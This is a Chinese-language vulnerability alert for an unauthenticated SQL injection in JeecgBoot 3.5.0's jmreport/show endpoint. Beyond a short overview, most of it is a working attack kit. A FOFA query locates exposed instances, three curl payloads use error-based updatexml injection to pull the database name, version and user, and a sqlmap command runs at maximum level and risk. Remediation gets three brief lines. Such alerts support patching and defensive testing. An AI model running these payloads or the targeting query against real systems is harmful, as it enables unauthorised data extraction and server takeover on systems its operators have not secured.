---
title: 【漏洞预警】JeecgBoot 3.5.0 show接口 SQL注入漏洞
---

## 漏洞概述
JeecgBoot3.5.0版show接口存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入获取数据库敏感信息，甚至写入木马获取服务器权限。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | JeecgBoot3.5.0版show接口SQL存在注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | JeecgBoot |
| 严重程度 | 高危 |

## FOFA查询
```
body="jeecg-boot"
```

## POC
```bash
# 报错注入 - 获取数据库名
curl "http://target/jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params={\"id\":\"1'and(updatexml(0x3a,concat(1,(database())),1))='\"}"

# 报错注入 - 获取数据库版本
curl "http://target/jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params={\"id\":\"1'and(updatexml(0x3a,concat(1,(@@version)),1))='\"}"

# 报错注入 - 获取用户
curl "http://target/jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params={\"id\":\"1'and(updatexml(0x3a,concat(1,(user())),1))='\"}"
```

特征：响应中包含 "SQLException" 或 "XPATH" 相关错误

使用sqlmap:
```bash
sqlmap -u "http://target/jeecg-boot/jmreport/show?apiUr1&id=961455b47c0b86dc96le90b5893bff05&params={\"id\":\"1\"}" --level=5 --risk=3
```

## 修复建议
1. 升级到最新版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面